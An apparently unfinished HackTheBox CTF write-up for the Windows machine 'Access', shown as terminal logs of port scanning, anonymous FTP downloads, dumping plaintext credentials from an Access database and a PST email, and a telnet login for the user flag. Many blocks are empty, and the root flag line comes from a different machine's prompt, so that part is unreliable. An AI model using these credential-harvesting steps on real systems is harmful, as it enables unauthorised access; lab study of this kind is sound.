# CTF Penetration Testing

## Platform: HackTheBox

### Machine: [Access](https://www.hackthebox.com/machines/Access)

<img src="https://labs.hackthebox.com/storage/avatars/adef7ad3d015a1fbc5235d5a201ca7d1.png" alt="Access Machine Logo" width="150"/>

- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
- Machine difficulty: 🟩 Easy (4.1)

> **Access** is an Easy difficulty Windows machine, that highlights how machines associated with the physical security of an environment may not themselves be secure. Also highlighted is how accessible FTP/file shares can often lead to getting a foothold or lateral movement. It teaches techniques for identifying and exploiting saved credentials.

#### Skills Learned

- ****
- ****
- ****
- 

#### Tools Used

Linux:
- `nmap`
- `whatweb`
- `ftp`
- `mdb-tools`
- `7z`
- `readpst`
- `telnet`
- ``

#### Machine Writeup

```
┌──(nabla㉿kali)-[~]
└─$ ifconfig tun0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.144  netmask 255.255.254.0  destination 10.10.14.144

[SNIP]
```

```
┌──(nabla㉿kali)-[~]
└─$ echo -e '10.129.36.36\taccess.htb' | sudo tee -a /etc/hosts

10.129.36.36	access.htb
```

```
┌──(nabla㉿kali)-[~]
└─$ ports=$(nmap -p- access.htb -T4 --min-rate=1000 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

```
┌──(nabla㉿kali)-[~]
└─$ echo $ports

21,23,80
```

```
┌──(nabla㉿kali)-[~]
└─$ nmap -Pn -p$ports -sSVC access.htb -T4

[SNIP]

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```
┌──(nabla㉿kali)-[~]
└─$ whatweb http://access.htb

http://access.htb [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.129.16.22], Microsoft-IIS[7.5], Title[MegaCorp], X-Powered-By[ASP.NET]
```

![Firefox - Access Homepage](./assets/screenshots/hackthebox_access_01.png)

****

```
┌──(nabla㉿kali)-[~]
└─$ ftp anonymous@access.htb

Connected to access.htb.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp>
```

```
ftp> dir
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer

ftp> dir Backups
08-23-18  09:16PM              5652480 backup.mdb

ftp> dir Engineer
08-24-18  01:16AM                10870 Access Control.zip

ftp> binary

ftp> get "Engineer\\Access Control.zip" access_control.zip
local: access_control.zip remote: Engineer\\Access Control.zip
226 Transfer complete.

ftp> get Backups\\backup.mdb backup.mdb
local: backup.mdb remote: Backups\backup.mdb
226 Transfer complete.
```

****

```
┌──(nabla㉿kali)-[~]
└─$ file backup.mdb 

backup.mdb: Microsoft Access Database
```

```
┌──(nabla㉿kali)-[~]
└─$ file access_control.zip 

access_control.zip: Zip archive data, at least v2.0 to extract, compression method=AES Encrypted
```

```
┌──(nabla㉿kali)-[~]
└─$ hexdump -C backup.mdb | head -n2

00000000  00 01 00 00 53 74 61 6e  64 61 72 64 20 4a 65 74  |....Standard Jet|
00000010  20 44 42 00 01 00 00 00  b5 6e 03 62 60 09 c2 55  | DB......n.b`..U|
```

```
┌──(nabla㉿kali)-[~]
└─$ mdb-tables backup.mdb | grep -o '\b[^ ]*user[^ ]*\b'

auth_user
auth_user_groups
auth_user_user_permissions
userinfo_attarea
```

```
┌──(nabla㉿kali)-[~]
└─$ mdb-export backup.mdb auth_user

id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

```
┌──(nabla㉿kali)-[~]
└─$ 7z l -slt access_control.zip

[SNIP]

Path = Access Control.pst
Folder = -
Size = 271360
Packed Size = 10678
Modified = 2018-08-23 19:13:52
Created = 2018-08-23 18:44:57
Accessed = 2018-08-23 18:44:57
Attributes = A
Encrypted = +
Comment = 
CRC = 1D60603C
Method = AES-256 Deflate
Host OS = FAT
Version = 20
Volume Index = 0
```

```
┌──(nabla㉿kali)-[~]
└─$ 7z x access_control.zip

[SNIP]

Enter password (will not be echoed):
Everything is Ok         

Size:       271360
Compressed: 10870
```

```
┌──(nabla㉿kali)-[~]
└─$ file Access\ Control.pst

Access Control.pst: Microsoft Outlook Personal Storage (>=2003, Unicode, version 23), dwReserved1=0x234, dwReserved2=0x22f3a, bidUnused=0000000000000000, dwUnique=0x39, 271360 bytes, bCryptMethod=1, CRC32 0x744a1e2e
```

```
┌──(nabla㉿kali)-[~]
└─$ readpst -tea -m Access\ Control.pst

Opening PST file and indexes...
Processing Folder "Deleted Items"
	"Access Control" - 2 items done, 0 items skipped.
```

```
┌──(nabla㉿kali)-[~]
└─$ ls -l Access\ Control

total 16
-rw-r--r-- 1 nvbla nvbla 3062 Jul  1 06:24 2.eml
-rw-r--r-- 1 nvbla nvbla 9728 Jul  1 06:24 2.msg
```

```
┌──(nabla㉿kali)-[~]
└─$ cat Access\ Control/2.eml

Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="--boundary-LibPST-iamunique-1859077550_-_-"

[SNIP]

Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,

John

[SNIP]
```

```yaml
credentials:
    username: security
    password: "4Cc3ssC0ntr0ller"
    protocol: telnet
    host: access.htb
    port: 23
```

```
┌──(nabla㉿kali)-[~]
└─$ telnet access.htb 23

[SNIP]

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================

C:\Users\security>
```

```
C:\Users\security> type C:\\Users\\security\\Desktop\\user.txt

831d8*************************** 🚩
```

```
┌──(nabla㉿kali)-[~]
└─$ 


```

```
┌──(nabla㉿kali)-[~]
└─$ 


```

```
┌──(nabla㉿kali)-[~]
└─$ 


```

```
┌──(nabla㉿kali)-[~]
└─$ 


```

```
┌──(nabla㉿kali)-[~]
└─$ 


```

```
┌──(nabla㉿kali)-[~]
└─$ 


```

```
┌──(nabla㉿kali)-[~]
└─$ 


```

```
┌──(nabla㉿kali)-[~]
└─$ 


```

```
root@inject:/opt/automation/tasks# cat /root/root.txt

adb83*************************** 🚩
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
